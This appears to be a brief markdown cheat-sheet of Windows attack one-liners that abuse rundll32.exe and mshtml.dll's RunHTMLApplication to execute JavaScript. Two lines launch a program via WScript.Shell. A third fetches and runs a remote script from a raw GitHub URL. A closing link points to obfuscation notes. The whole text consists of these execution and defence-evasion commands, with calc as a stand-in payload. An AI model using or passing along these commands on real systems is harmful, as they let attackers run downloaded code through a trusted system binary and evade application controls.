`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc");` <br>
<br>

`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");`
<br>
<br>

`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js")
`
<br><br>

##### obfuscation 
https://github.com/sailay1996/expl-bin/blob/master/obfus.md
